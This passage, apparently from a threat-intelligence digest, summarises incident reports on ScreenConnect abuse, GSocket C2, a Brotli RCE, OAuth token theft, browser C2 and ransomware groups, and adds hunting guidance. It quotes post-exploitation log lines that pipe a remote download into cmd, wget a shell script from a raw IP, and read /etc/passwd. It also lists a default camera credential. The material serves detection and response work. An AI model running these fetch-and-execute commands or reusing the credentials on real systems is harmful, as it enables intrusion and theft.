- A batch script named SSA-2026-STATEMENT-15518787.bat, uploaded to VirusTotal on July 25, 2026 and disguised as a Social Security Administration statement, references rogue client ID ed630cc2c873b091 and pulls ScreenConnect MSI installers from cdn007-digitaldownloads[.]com. The script adds Microsoft Defender exclusions, establishes persistence via the Windows Startup folder and the Run registry key, and sends a Telegram notification on successful install. Sequential attacker-assigned tags in the current campaign suggest earlier MSP victims may exist who have not yet received alerts.
- ConnectWise has confirmed it is investigating and issued direct guidance: avoid opening interactive ScreenConnect sessions to suspected compromised devices, review account activity, revoke active sessions, reset credentials from a trusted device, and verify MFA enrollment.
Takeaway: Pull your ScreenConnect Run Command history now, even without alerts, and grep for the rogue client IDs 2588ef5c15954b10 and ed630cc2c873b091 and the installer pattern /Bin/ScreenConnect.ClientSetup.msi containing "Exploited" in the query string. Hunt Defender exclusion modifications, Startup folder writes, and Run key changes consistent with the SSA-themed dropper. Block the listed IPs and domains at the perimeter. Do not initiate interactive ScreenConnect sessions to any endpoint you suspect is in scope until the reverse-pivot technique is fully characterized. IOCs are in the Huntress report.

item.title: GitHub - Yamato-Security/juntei: DFIR analyzer for Windows forensic artifacts
item.description:
Yamato Security releases Juntei, a Rust-based Windows forensic artifact parser covering 42 artifact types across execution, persistence, browsers, email, file system, and more, with native VHDX and E01 image support.
Key details:
- Juntei's auto-parse mode (juntei auto-parse -d <EVIDENCE> -o <OUTPUT>) discovers multiple collected Windows systems and parses every supported artifact in parallel, grouping results by computer and artifact category. Output is CSV, JSON, or JSONL, with optional SIEM-ready JSONL using -j. It handles VHDX images natively on Linux, macOS, and Windows without FUSE or admin rights, and E01/Ex01 physical images via --e01, covering split image sets. Staging uses temporary file copies, so plan disk space accordingly.
- The 42 supported artifacts span execution evidence (Prefetch, BAM/DAM, UserAssist, SRUM, ShimCache, Amcache), file system forensics ($MFT, $LogFile, $UsnJrnl:J, $I30, Secure:SDS), user activity (ShellBags, Jump Lists, LNK files, MRU lists, RecentDocs, Office Trusted Documents), USB device history with serial numbers and mount times, network history, and browser artifacts across Chrome, Edge, Brave, Firefox, and IE/legacy Edge, including deleted visits and form entries recovered from write-ahead logs.
- The persistence-hunter command (juntei persistence-hunter) is a native Rust port of PyrsistenceSniper running 131 checks across registry hives, scheduled tasks, startup files, WMI, and BITS. It supports allow/block profiles, maps findings to ATT&CK techniques, notes which checks lacked readable evidence, and outputs CSV, JSON, or JSONL. Results are persistence candidates, not proof of execution or compromise.
- Coverage extends to forensically significant registry artifacts often missed in triage: LSA secrets (names and set-times only, nothing decrypted), SAM local accounts, audit policy per subcategory (revealing what log gaps actually mean), security settings flagged where they weaken defaults (WDigest, LSA protection, PowerShell logging, AMSI, SMBv1, Defender exclusions), and Microsoft Defender quarantine including original paths, hashes, download origins, and recoverable quarantined content.
- Outlook PST and OST parsing (Outlook 2013 and later OSTs included) covers email with senders, recipients, timestamps, attachments with SHA-256 and optional extraction, embedded items, contacts, calendar entries, tasks, and hidden folder items. This makes Juntei relevant beyond endpoint triage into insider threat and business email compromise investigations without a separate mail forensics tool.
Practitioners handling multi-system collections should run juntei auto-parse with -j for a SIEM-ingestible JSONL output, then layer persistence-hunter results on top. The Defender quarantine parser is worth running early: original file paths, hashes, and download origins from Quarantine\Entries and ResourceData can anchor your timeline before you touch MFT or Prefetch. The Juntei documentation covers artifact interpretation and common analysis mistakes, worth reading before you treat ShimCache or Amcache entries as execution proof.

item.title: The global socket: how threat actors are weaponizing GSocket for stealthy C2
item.description:
Multiple unrelated threat actors are weaponizing GSocket on compromised Linux servers to maintain C2 that survives vulnerability patching, with detections up 356.2% from March to August 2026.
Key findings:
- GSocket (gs-netcat) routes traffic through the Global Socket Relay Network, a shared public relay neither owned nor operated by the threat actor. Both the compromised host and the operator connect outbound to the relay, which brokers an end-to-end encrypted session keyed to a shared secret rather than a fixed IP or domain. This means blocking a threat actor IP or domain does not cut off access. Egress filtering is the relevant control, not inbound rules. Microsoft's report notes 87.1% of attributable incidents involved web applications and hosting, with PHP apps and cPanel representing 63.9% and Apache 24.3%. Education and research was the most affected sector at 30.7%.
- The deployment chain starts with RCE against an internet-facing application (T1190), followed by curl fetching the installer from gsocket[.]io/y or gsocket[.]io/install.sh. The binary (HackTool:Linux/GsNetcat.A!MTB or HackTool:Linux/GsNetcat!rfn) stages into /dev/shm/.gs-0, a memory-backed directory. Persistence layers across cron (T1053.003), systemd units (T1543.002), shell profiles, and watchdog processes. In a subset of intrusions, threat actors attempted local privilege escalation via CVE-2026-43284 (Dirty Frag) to reach root from the web-service account.
- Defense evasion is thorough and deliberate. The report documents gs-netcat renamed to systemd-remount-d (T1036), execution under argument-zero name [kaluad] via exec -a, chmod 700 on /usr/bin/defunct (T1222.002), touch commands to backstamp /usr/bin/defunct and defunct.service with older timestamps (T1070.006), and rm plus rmdir clearing the /dev/shm/.gs-0 staging directory after deployment (T1070.004). Investigators should not assume a clean /dev/shm means no deployment occurred.
- IOCs in the report include four SHA-256 hashes: d94f75a70b5cabaf786ac57177ed841732e62bdcc9a29e06e5b41d9be567bcfa (x86-64 payload), f95c4d029e6784e3849b4d1e2e2ae1a661187236ef7c5d487c71158a290a03b5 (AArch64 payload), 55d141bb2f62c527c3fea3413b8429fed7d52633d0b123b5e611bfa42165229f (systemd-remount-d at /tmp and /usr/bin), and 12450bafc7a4398040e1ad3a16dbf4dbc79b6a8f83ef306c4f0f73f59886f06c (/tmp/.gsn_ora). Distribution domains are gsocket[.]io and gsgg.b-cdn[.]net. The report includes five Advanced Hunting (KQL) queries covering process activity, installer downloads, network connections to distribution hosts, hash matches, and staging/persistence artifact paths.
Patching the vulnerable application does not remove GSocket. On any Linux web server you are investigating, hunt cron, systemd units, and shell profiles for entries referencing defunct, defunct.service, systemd-remount-d, gs-netcat, or gsocket[.]io. item.content:encoded:
Multiple unrelated threat actors are weaponizing GSocket on compromised Linux servers to maintain C2 that survives vulnerability patching, with detections up 356.2% from March to August 2026.

Key findings:

- GSocket (gs-netcat) routes traffic through the Global Socket Relay Network, a shared public relay neither owned nor operated by the threat actor. Both the compromised host and the operator connect outbound to the relay, which brokers an end-to-end encrypted session keyed to a shared secret rather than a fixed IP or domain. This means blocking a threat actor IP or domain does not cut off access. Egress filtering is the relevant control, not inbound rules. Microsoft's report notes 87.1% of attributable incidents involved web applications and hosting, with PHP apps and cPanel representing 63.9% and Apache 24.3%. Education and research was the most affected sector at 30.7%.

- The deployment chain starts with RCE against an internet-facing application (T1190), followed by curl fetching the installer from gsocket[.]io/y or gsocket[.]io/install.sh. The binary (HackTool:Linux/GsNetcat.A!MTB or HackTool:Linux/GsNetcat!rfn) stages into /dev/shm/.gs-0, a memory-backed directory. Persistence layers across cron (T1053.003), systemd units (T1543.002), shell profiles, and watchdog processes. In a subset of intrusions, threat actors attempted local privilege escalation via CVE-2026-43284 (Dirty Frag) to reach root from the web-service account.

- Defense evasion is thorough and deliberate. The report documents gs-netcat renamed to systemd-remount-d (T1036), execution under argument-zero name [kaluad] via exec -a, chmod 700 on /usr/bin/defunct (T1222.002), touch commands to backstamp /usr/bin/defunct and defunct.service with older timestamps (T1070.006), and rm plus rmdir clearing the /dev/shm/.gs-0 staging directory after deployment (T1070.004). Investigators should not assume a clean /dev/shm means no deployment occurred.

- IOCs in the report include four SHA-256 hashes: d94f75a70b5cabaf786ac57177ed841732e62bdcc9a29e06e5b41d9be567bcfa (x86-64 payload), f95c4d029e6784e3849b4d1e2e2ae1a661187236ef7c5d487c71158a290a03b5 (AArch64 payload), 55d141bb2f62c527c3fea3413b8429fed7d52633d0b123b5e611bfa42165229f (systemd-remount-d at /tmp and /usr/bin), and 12450bafc7a4398040e1ad3a16dbf4dbc79b6a8f83ef306c4f0f73f59886f06c (/tmp/.gsn_ora). Distribution domains are gsocket[.]io and gsgg.b-cdn[.]net. The report includes five Advanced Hunting (KQL) queries covering process activity, installer downloads, network connections to distribution hosts, hash matches, and staging/persistence artifact paths.

Patching the vulnerable application does not remove GSocket. On any Linux web server you are investigating, hunt cron, systemd units, and shell profiles for entries referencing defunct, defunct.service, systemd-remount-d, gs-netcat, or gsocket[.]io. Check /dev/shm and /tmp for dot-prefixed directories and hidden files matching .gs-0 or .gsn_ora. Verify outbound connections to gsocket[.]io and gsgg.b-cdn[.]net have stopped after remediation. The report's KQL queries and full IOC table are ready to deploy directly.

item.title: Node2Shell/HTTP2Shell Detection
item.description:
CVE-2026-111497 (Node2Shell/HTTP2Shell) is a CVSS 4.0 9.2 out-of-bounds write in Google's Brotli C decoder, exploited in the wild, in CISA KEV, and reaching far beyond Node.js to Python, .NET, Bun, Envoy, Istio, and curl.
Key findings:
- The flaw has been in Brotli since version 1.0.3 (March 2018). A crafted stream that declared one block type then switched blocks bypassed rejection, allowing the decoder to write past a buffer. Any process decoding attacker-controlled Brotli data is in scope, whether it arrives as an inbound compressed request body or an outbound compressed response. Code execution on Node.js has been publicly demonstrated against Node.js 24.22.0, and both Imperva and ELLIO reproduced it. Python runtimes crash on malicious input but RCE has not been demonstrated there yet. CISA added CVE-2026-111497 to KEV on 27 October 2026 with a US 🇺🇸 federal patch deadline of 10 November 2026.
- The 11-event log sample covers a two-minute window on 26 October 2026 across three hosts: app-node-01 (Linux, Node.js), web-prod-01 (Linux, Python), and win-dev-01 (Windows, Node.js). The only direct forensic evidence of exploitation was the kernel/systemd-coredump message showing node segfaulting inside libbrotlidec[.]so.1.1.0 with BrotliDecoderDecompressStream at the top of the core dump stack. EDR process events carried everything that followed. Without coredump forwarding, the initial crash is invisible.
- Post-exploitation on app-node-01 shows node /opt/app/server.js spawning curl fetching the C3Pool XMRig miner setup script, wget pulling hxxp://198.51.100[.]23:3000/s.sh, ping -c 1 to 5axzi7.dnslog[.]cn as an out-of-band callback check, and cat /etc/passwd. On win-dev-01, node.exe spawned cmd.exe /c "curl -s hxxps://198.51.100[.]23/api/w | cmd" followed by hidden powershell.exe running whoami. The Windows activity fell outside the reported detection chain but was flagged by separate rules including Suspicious NodeJS Child Processes [Windows], Read Contents From Stdin Via Cmd.EXE, and Suspicious Powershell Cmdlets.
- Patching Node.js alone is insufficient. Fixed versions span Node.js 22.23.4, 24.22.1, and 26.12.1; Node.js 20 and all end-of-life lines get no fix. Bun needs 1.4.4; Google Brotli library needs 1.0.10, 1.1.1, or 1.2.1; PyPI brotli needs 1.2.1 and brotlicffi needs 1.2.1.0; .NET runtime 8/9/10 have dedicated fixes; Envoy and Istio have their own fixed releases. Envoy, Istio, and .NET are only exposed with Brotli decompression explicitly enabled. curl is exposed only when invoked with --compressed against an unpatched system libbrotli.
Practitioner takeaway: forward kernel and systemd-coredump logs alongside EDR process telemetry for every Node.js and Python host. The core dump stack (libbrotlidec[.]so with BrotliDecoderDecompressStream) is the evidence of the initial hit; without it you see only the post-exploitation. Hunt for node, node.exe, or python3 as a parent process spawning curl, wget, ping, sh, cmd.exe, or powershell.exe. Block egress to 198.51.100[.]23 and *.dnslog[.]cn. Check for a running xmrig process, new cron entries, and new systemd units. Because /etc/passwd was read on app-node-01, treat account enumeration as confirmed and review accounts accordingly. As a temporary control until patching is complete, reject Content-Encoding: br at the WAF case-insensitively, including within comma-separated lists such as "gzip, br". IOCs for this sample are in the report.

item.title: MSP Process security incident creates customer tenant risk
item.description:
MSP Process vendor breach exposed OAuth client secrets and GDAP tokens across customer Microsoft 365 tenants, with confirmed malicious activity in at least one environment and authentication attempts logged across 47 others.
Key findings:
- The threat actor accessed MSP Process internal storage between 09:56 and 14:40 UTC on November 7, obtaining application client IDs, client secrets, administrator refresh tokens, and Granular Delegated Admin Privileges relationship data. These credentials support Microsoft Graph application permissions including Application.ReadWrite.All, AppRoleAssignment.ReadWrite.All, UserAuthenticationMethod.ReadWrite.All, and User.ReadWrite.All. Combined, those permissions allow an application to authenticate to Microsoft 365 silently, without a user sign-in or MFA challenge, via the OAuth client credentials flow.
- In at least one confirmed environment the threat actor did not stop at authentication. They granted additional permissions to the MSP Process application, added credentials to dozens of applications, created service accounts, accessed data, and re-enabled accounts that responders had disabled during containment. Administrator refresh token abuse was attempted but reportedly failed. This pattern illustrates the core DFIR risk: removing the original credential does not undo what was created before revocation. Backdoor credentials on other apps, new service principals, new directory roles, and newly registered MFA methods all survive remediation of the initial access path.
- Activity appears in Microsoft Entra ID audit logs under the application's identity, not a user's, which is exactly why it is easy to miss in routine triage. The report recommends starting your log review at November 6, 2026. Priority event types: application role assignments, service principal credential additions, directory role assignments, account creation, account re-enablement, password resets, MFA registration, and Temporary Access Pass creation. Within Microsoft Purview unified audit log, also review mailbox access, file downloads, inbox rule creation, and forwarding changes tied to MSP Process application identifiers.
- MSP Process apps may appear under names including "Identity Management" or "Microsoft Authenticator" rather than the vendor's name, and the owning tenant listed may be the MSP's tenant rather than MSP Process or Microsoft. Verify by application ID and owning organization before revoking, to avoid disabling legitimate services.
- Organizations using Microsoft Entra ID Free have a hard deadline: export audit and sign-in logs before November 14, 2026, when records from the incident window begin to expire.
Practitioner takeaway: this is a supply-chain application identity incident, not a credential phishing case. Containment means deleting MSP Process client secrets from your Entra ID app registrations, revoking consent, revoking sessions for the connecting administrator account, and keeping integrations offline until MSP Process confirms full remediation. Then hunt for persistence independently: enumerate service principals created after November 6, check every app registration for credentials added in that window, review directory role membership changes, and audit non-interactive sign-in logs for the connecting admin account. The report's IOC and artifact guidance is embedded in the analysis above. The clock on Free-tier log retention runs out November 14.

item.title: The XG Files: Falcon C2 Flying Under The (Browser) Radar
item.description:
Falcon (aka XG/Xiàng Gē), a browser-native C2 framework, hit ministries of foreign affairs, defense, interior, and law enforcement across one Middle Eastern and four Southeast Asian countries between March and May 2026.
- Falcon runs entirely inside the browser. When a victim visits a compromised webmail portal or government web app, the server delivers a session-unique implant (built from victim_common.js and victim.js) that is XOR-obfuscated, decoded on the fly, and never written to disk as a traditional file. It opens a persistent TLS WebSocket to the C2, negotiates an RSA-2048 / AES-256-CBC session key, and heartbeats every minute with {"heartbeat":"1"}. The session ID is stored as Hm_lvt_$ in browser local storage and as a Hm_lvt__[session ID] cookie expiring in 2099, mimicking Baidu Analytics identifiers to blend into telemetry. Known C2 domains include fonts.tarotfree101[.]top, fonts.chrorne[.]com, and robot.avbliud[.]com, with the management panel on TCP/8080 and the victim listener on TCP/443. Unit 42 links Falcon to PeckBirdy (reported by Trend Micro in January 2026) based on near-identical URL structures, AES encryption, and that same Baidu-mimicking cookie naming convention.
- The malicious Chrome extension (ID: mbidcmlcbgbphpoacojjbmfpohcimjji) masquerades as "PDF Viewer" and requests 40 permissions covering all URLs, cookies, credentials, downloads, clipboard, and browser history. Its architecture splits work across background.js (FIFO credential and cookie cache), content-script.js (credential theft, clipboard hijacking, network hooking), analytics-core.js (hooking window.fetch and XMLHttpRequest to intercept HTTP 200 responses), and twitter-dm.js (scraping X/Twitter DMs using CSS coordinate layout). An operator can also use a victim's browser as a proxy by routing requests through the sandbox with the victim's credential store attached, enabling session hijacking against internal systems. The extension was observed checking in every 3 to 4 minutes for over three weeks on a Southeast Asian justice department network, where the operator manually screenshotted a routing slip and exfiltrated plaintext credentials alongside 20+ document views.
- Antino, the Rust-based second-stage implant delivered via a fake Adobe Flash Player update prompt (served from hxxps[:]//microsoft-flash[.]com/download/Adobe_installer.exe), uses Microsoft OneDrive as its C2 channel, beaconing to antino/heartbeat/[Bot ID].json and polling for command files in command_req_[Bot ID]_[timestamp].json format. Configuration is XOR-encoded with the 2-byte key 0xABCD in the .cfg PE section and holds OneDrive OAuth credentials (tenant, client, secret, user IDs). Persistence is achieved by writing a diagnostic answer file to %TEMP%\SDIAG_[GUID]\result\result.ps1, which sdiagnhost.exe parses to execute a PowerShell snippet that adds Antino to the HKCU Run key. The binary copies itself to %LOCALAPPDATA%\Windows GatherOSStateKit\tmp[8 char].exe. The earliest known sample dates to Oct. 6, 2025; the campaign delivery hash is 0c39264337a1186b2e765e24073399cbdcba118306614eb411e315887af578bd (flashcenter_pp_ax_install_en.exe).
- Detection opportunities the Unit 42 report specifically calls out: hunt for Hm_lvt_ cookies or local storage keys on internal portals where Baidu Analytics has no legitimate presence; look for script tags injected into webmail or case-management portal headers whose responses are large integer arrays with a small decoder loop; audit Chrome extensions installed in developer mode requesting host_permissions of all URLs, especially those named PDF Viewer; and monitor OAuth token issuance and OneDrive write activity to paths outside your own tenancy, particularly repeated small JSON writes under antino/heartbeat/ or antino/antino_upload/. Full IOC tables (Chrome and Firefox extension file hashes, C2 and delivery domains) are in the report.
Hunt: Query your proxy or DNS logs for the three Falcon C2 domains above, then pivot to any host that contacted them and check Chrome's local storage for Hm_lvt_$ keys or the extension ID mbidcmlcbgbphpoacojjbmfpohcimjji in the installed extensions list. For Antino, correlate sdiagnhost.exe process creation with child PowerShell and new Run key writes, and search OneDrive audit logs for the heartbeat path pattern.

item.title: Defender’s hidden flight recorder: decrypting mpenginedb.db
item.description:
Windows Defender's internal SQLite database, mpenginedb.db, is an undocumented forensic artifact storing attack scoring, file hashes, side-load indicators, and Tamper Protection state, previously invisible to every major forensic toolset.
Key findings:
- mpenginedb.db lives at C:\ProgramData\Microsoft\Windows Defender\Scans\ alongside its WAL file. Defender calls it MetaVault internally, maintained by mpengine.dll and written by Lua scripts embedded in signature files (mpasbase.vdm / mpavbase.vdm). It was not covered by any KAPE map, Velociraptor artifact, Dissect module, or any of SQLECmd's 95 stock maps before the Protokol-7 report. SQLECmd silently skips it because the SQLite magic bytes are encrypted, and the skip only appears under --debug or when you point at the file directly.
- The encryption is RC4 with a fixed 256-byte key stored in mpengine.dll, reused identically across every page with no nonce and no integrity check. The key belongs to the engine build, not the machine, confirmed across two separate Windows 11󠁧󠁢󠁥󠁮󠁧󠁿 systems both running engine build 1.1.26100.4. Because SQLite pages zero-fill unused space, XORing those zeroes against the keystream recovers the keystream directly from the evidence file, so the key can be rebuilt without ever touching mpengine.dll. The WAL frame headers are plaintext; only page data is encrypted, and checksums are computed over encrypted bytes, so decryption must happen before frame validation.
- The database covers roughly the last two weeks and contains several forensically distinct tables. AttributePersistContext holds Tamper Protection state (MpTamperProtectionState), PE creation and execution markers (NewPECreatedNoCert, ExecutedPENoCert), DLL side-loading indicators (BM_IsPotentialSideLoad), and file origin context including download sources like Discord or Telegram. FileHashes retains SHA-256 values and MFT entry numbers, recoverable even after the original file is deleted and other artifacts like Amcache or Sysmon logs are gone. BackupProcessInfo stores executable paths and NextUSN values that can be correlated directly against the NTFS USN Change Journal ($UsnJrnl). RollingQueuesValues maps PIDs and FILETIME-encoded process start times to MITRE ATT&CK technique IDs, including an example resolving to T1547.001. MetaInventory holds CPE identifiers and can flag files against known CVEs.
- WAL recovery extends the value further. The report demonstrates a case where MpTamperProtectionState=off existed in a WAL-recovered row but was absent from the final database state, meaning Defender's own internal records can preserve historical security posture that the live database no longer shows. The Python parser carves deleted rows with a quality flag for partially overwritten records and reconstructs the database after every saved WAL transaction, producing per-table CSVs, a timeline.csv, recovered rows, and a SHA-256 manifest. The PowerShell path (Decrypt-MpEngineDb.ps1) produces a byte-identical decrypted file and feeds it to SQLECmd using the new Windows_MicrosoftDefender_MpEngineDb.smap, which runs 13 queries covering attack scoring, path tags, ASR state, hash cache, rollback tracking, LowFi hits, AMSI cache, blocked and monitored processes with command lines, ransomware detections, firewall rules, and Controlled Folder Access paths.
Takeaway: add C:\ProgramData\Microsoft\Windows Defender\Scans\mpenginedb.db and mpenginedb.db-wal to your collection targets now. The parser (mpenginedb_parser.py) and the SQLECmd map are published at the GitHub links in the Protokol-7 report. Use --derive-key to rebuild the RC4 keystream from the evidence itself rather than the bundled key, keeping your result valid regardless of engine build. On any case where Tamper Protection may have been disabled, Defender logs cleared, or files deleted before acquisition, this database may hold the only surviving record.

item.title: Android FCM Push Notification Artifacts: What Can Remain After An App Is Deleted
item.description:
FCM artifacts in Google Play Services survive app deletion on Android, leaving push notification records in a shared LevelDB store that many examiners never check.
Key findings:
- The artifact lives under com[.]google[.]android.gms, the Google Play Services data area, in a LevelDB-based key-value store. Because every app routes FCM push messages through this shared system component, records from multiple apps accumulate in one place, independent of whether the receiving app is still installed. Each record identifies the receiving app and the timestamp the message was received.
- Apps examined include LINE, Telegram, KakaoTalk, Signal, WhatsApp, TikTok, and BAND. The payload handling varies by app and falls into one of three patterns: plain text (notification title and body readable after decoding), encrypted (body present but ciphertext only), or metadata only (a delivery event with no message body). The Forensic Focus report covers which app maps to which pattern and what additional fields appear alongside the message body.
- LevelDB's storage behavior matters here. LevelDB does not overwrite records in place; it appends and compacts. That means deleted or updated records can persist in the underlying .ldb and .log files even after the app that sent or received them is gone. What survives depends on whether a compaction has run, so collection timing and acquisition method affect recoverability.
- This is an additional evidence source, not a replacement for app-level analysis. Schemas can change across app versions, and the FCM store will not carry everything the app itself logged. But for a device where the messaging app was wiped before seizure, this layer can establish that a message arrived, when it arrived, and in some cases what it said, without touching the deleted app's own databases.
Practitioner takeaway: When examining an Android device where a messaging app has been deleted, include the com[.]google[.]android.gms data directory in your collection. Parse the LevelDB files there for FCM records and cross-reference delivery timestamps against other timeline artifacts. The full decoding details, field-level breakdown by app, and guidance on what to collect alongside the LevelDB files are in the Forensic Focus Tech Content report.

item.title: Blind Eagle Uses Fake Court Notices to Deliver Remote Access Trojan Across Latin America
item.description:
Blind Eagle (APT-C-36) hit Latin American judicial orgs with ~3,300 phishing emails using SVG-based HTML smuggling to deliver an AsyncRAT/DCRat fork. Hunt the Windows Startup folder for persistence and check memory for in-process RAT payloads.

item.title: CERT-In’s CRAFTY FALCON Advisory: AI Is the Accelerant, Your Payment APIs Are the Target
item.description:
CRAFTY FALCON, an AI-assisted threat actor, is draining Indian 🇮🇳 fintechs and payment platforms by calling their own production APIs, re-hitting remediated victims on weekends, and moving money before most orgs finish patching.
Key details:
- CERT-In advisory CIAD-2026-0058 (Nov. 4, 2026) names the actor and confirms the campaign is active across NBFCs, digital lenders, payment aggregators, payment service providers, and crypto exchanges. Entities that remediated after the Oct. 9 advisory were deliberately re-targeted, some after incomplete cleanup, with attacks timed for holidays and weekends when response capacity is lowest. CERT-In does not formally attribute the actor, though Business Standard reporting links at least two of the named tools to China 🇨🇳.
- The four AI frameworks CERT-In names by name are ARTEX, PentAGI, the Cairn attack search engine, and CyberStrikeAI. These are publicly available offensive tools. What they change is not the vulnerability class but the tempo: the advisory states they run full attack chains autonomously, adapt payloads based on target responses, refine scripts in rapid succession, and rotate infrastructure within hours. Reverse-engineering a lender's app and mapping its API surface went from a multi-day project to something an agent runs through a target list overnight.
- The kill chain runs four stages. Initial access exploits hardcoded API tokens, plaintext credentials, MFA-less services, file-upload and deserialization flaws, and forged repository commits on exposed UAT and staging servers. Lateral movement into production travels across shared credentials and network paths, with AWS Systems Manager and Lambda used to run commands through legitimate cloud channels. The attacker then reverse-engineers the app, calls payment and disbursement APIs from a modified package, and routes traffic through allow-listed third-party fetcher IPs to bypass KYC, beneficiary verification, balance checks, and per-transaction limits. A Rs 1 test transfer confirms the path, large transfers follow to mule accounts and crypto wallets, and logs and endpoint tooling are tampered with before exit.
- A separate but related finding: researcher Badbyte identified that a GitHub-distributed copy of ARTEX pulled a Docker image containing a hidden root shell. Between Nov. 2 and 4, 62 internet-facing ARTEX consoles were exposed to that backdoor. Nothing in the advisory ties this to CRAFTY FALCON directly, but it is the reason CERT-IN is pushing to ban these tools from corporate infrastructure entirely.
Practitioner takeaway: Hunt your AWS CloudTrail now for Systems Manager SendCommand events and Lambda UpdateFunctionCode calls in production environments, and flag new IAM users, roles, or keys created in the same window. For the money path, query transaction logs for micro-value transfers (sub-Rs 2) to new beneficiaries immediately followed by large outbound settlements, especially through merchant settlement APIs over weekends. Verify that UAT and staging environments share zero credentials, keys, databases, or network routes with production, and alert on any cross-environment access. The full 27-control checklist is in CERT-In advisory CIAD-2026-0058.

item.title: Citrus Ransomware: VLESS for traffic, Sn00py for encryption, and LLMs lending a hand
item.description:
Previously undocumented Citrus ransomware group uses VLESS tunnels, LLM-generated scripts, and Sn00py RaaS to hit Russian 🇷🇺 organizations, entering through compromised contractor accounts.
Key findings:
- Initial access comes exclusively through contractor supply chain compromise: stolen credentials used to authenticate over corporate VPN or RDP to internet-facing terminal servers. Once inside, the group escalates using CVE-2026-54121 (Certighost), an AD CS authentication bypass that creates machine accounts with names matching GHOST{8 random letters} in Active Directory, then abuses the cdc attribute in certificate requests to redirect CA verification to an attacker-controlled host (91.210.109[.]118). They also carry CVE-2020-1337 in a Metasploit-linked executable for additional escalation. Watch for unexpected machine account creation in AD and anomalous certificate requests where the Attributes field contains a cdc entry pointing to an external IP.
- The group's C2 infrastructure runs through Xray, downloaded via certutil, BITS, cURL, or PowerShell, then configured to establish reverse VLESS tunnels over port 443, with REALITY protocol disguising traffic as requests to mirror[.]yandex[.]ru and yastatic[.]net. The config file is typically named config.json and sometimes deleted immediately after tunnel startup. AnyDesk is installed silently alongside Xray for interactive access. File paths to hunt: C:\ProgramData\WebEx\webex.exe, C:\ProgramData\mst.exe, C:\ProgramData\xray.exe, C:\ProgramData\config.json, and C:\ProgramData\rpchost.exe. Scheduled tasks named Java, rpchost, and agent provide persistence.
- Credential harvesting uses mimikatz (C:\ProgramData\x64\mimikatz.exe with mimidrv.sys, mimilib.dll, mimispool.dll), a modified peeping-tom keylogger at C:\ProgramData\oracle\java\jhost.exe logging to C:\Users\*\AppData\Roaming\Microsoft\CLR\ErrorLog.txt with exfil to 91.210.109[.]118, and Snaffler for hunting secrets across network shares. The group also targets KeePass on admin workstations and harvests Telegram session data from C:\Users\*\AppData\Roaming\Telegram Desktop\tdata via steal_tgs.ps1, packing output into archives named systemname_date_username_tdata.zip, then exfiltrating through Google Chrome. ADRecon runs on domain controllers; SharpHound runs on workstations.
- LLM use is a distinguishing operational signature. Commands and scripts contain inline comments atypical of human attacker tradecraft, including commented-out admin account disable commands and a session-enumeration script with structured threading comments. The Deploy-KasperskyGPO.ps1 script that creates the malicious GPO also contains LLM-style comments. The group uses Impacket's atexec to create scheduled tasks with randomized names (sIErKswD, PpMBCCSR, QwZtLmNp) that execute cmd.exe via path traversal variants like C:\Windows\..\Windows\System32\cmd.exe. 1C:Enterprise servers are abused via 1C-Shell for command execution on those platforms.
- Sn00py ransomware (Go-based, RSA-2048 plus ChaCha20) appends .citrus to encrypted files and drops CITRUS_README.txt. The ransomware is distributed via a malicious GPO named Kaspersky GPO, propagated through SYSVOL (C:\Windows\SYSVOL\domain\build_64.exe), which also disables VSS, disables Windows Defender via registry modification, and sets a ransom-note desktop wallpaper. Domain controllers DC01 through DC04 are explicitly excluded from encryption via host_blacklist to keep GPO propagation alive. The RaaS console banner reads "Made with RaaS platform Sn00py." Two Sn00py hashes are in the report: 17b29b6c9de80402a45e321bbe1168fa and 9eee984b187423c46c10a63d080da15d. The group shares TTPs and tooling directories with Toy Ghouls and has been observed hitting the same victims simultaneously.
Takeaway: Hunt for GHOST-prefixed machine accounts in AD and certificate requests where the Attributes field carries a cdc value pointing externally. Check SYSVOL for build_64.exe, wallpaper.bmp, and icon.ico. Review scheduled tasks named Java, rpchost, agent, KasperskyAgentInstallTask, and Sysvc. The NTFS USN journal is your friend for recovering steal_tgs.ps1 activity and 7-Zip archive creation under C:\ProgramData\tdatas even after file deletion. Full IOC list including file hashes, file paths, and C2 IPs is in the Kaspersky SecureList report.

item.title: Inside The Server: 14 Months of Offensive Cyber Operations Targeting Europe
item.description:
Russian-speaking threat actor DarkLunnen exposed 14 months of offensive operations via an open directory on a Latvian 🇱🇻 server, targeting Ukrainian 🇺🇦 defense, aviation, and critical infrastructure across Europe and beyond.
Key findings:
- The operator's /root/ directory at 46.8.236[.]121:8090 was served by a Python SimpleHTTP server, exposing shell histories (.bash_history: 1,368 commands; .zsh_history: 1,520 commands with timestamps), exploit scripts, target lists, and stolen configs. Group-IB recovered 35 of 457 files totaling 3.1 GB before the directory went offline. The .wget-hsts file places earliest activity at April 14, 2025 (ukroboronprom[.]com[.]ua), and zoxide records show 36 visits to /root/ukrain with the last on July 24, 2026, two days before discovery. The operator appeared active the day researchers found the server.
- The primary campaign weaponized CVE-2024-55591 (FortiOS auth bypass) using a modified watchTowr PoC, chfrt/popoc[.]py, hardcoded to create a backdoor super_admin account named "service." Scan results identified roughly 600 vulnerable FortiGates in Turkey, 16 in Ukraine 🇺🇦, 14 in Azerbaijan, and 1 in Algeria. A recovered 14,528-line FortiGate 81F config from a Romanian 🇷🇴 organization carried the "service" account in its header and 10 cleartext VPN passwords in passwds.txt, followed by shell-history commands showing VPN login and internal network scanning of that organization's infrastructure. Additional FortiGate target lists for Switzerland 🇨🇭, South Korea 🇰🇷, and Ireland 🇮🇪 were recovered; file manifest references suggest targeting across 15 countries total.
- The VNC brute-force campaign produced pl/good.txt with 5,775 reportedly successful authentications against Ukrainian 🇺🇦 and Polish 🇵🇱 endpoints. The pl/bruteforced.log (945 entries) records desktop names returned after login: roughly a quarter carry HMI WebServer, Weintek cMT-series designations (cMT3162X, cMT3072X, cMT-FHDX-220), and B&R visualization project names, indicating access to industrial HMI interfaces. The password Admin@1980 appears 28 times. Separately, 12,183 Ukrainian 🇺🇦 IPs were scanned for CVE-2017-7921 (Hikvision auth bypass), yielding eight vulnerable cameras with snapshot URLs carrying base64 credential auth=YWRtaW46MTEK (admin:11).
